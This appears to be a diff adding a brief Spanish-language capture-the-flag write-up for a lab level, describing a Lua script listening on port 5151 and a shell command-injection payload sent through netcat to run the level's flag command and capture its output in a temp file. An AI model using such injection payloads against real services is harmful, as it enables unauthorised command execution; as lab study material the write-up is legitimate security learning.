@@ -1,0 +1,7 @@
+Al entrar en el usuario level11 me encuentro con 
+level11.lua, este script escucha en el puerto 5151
+y ejecuta un echo, a través de este he podido inyectar
+el comando getflag de la siguiente manera:
+
+echo "\$(getflag > /tmp/jeje) && echo xd" | netcat 127.0.0.1 5151
+cat /tmp/jeje
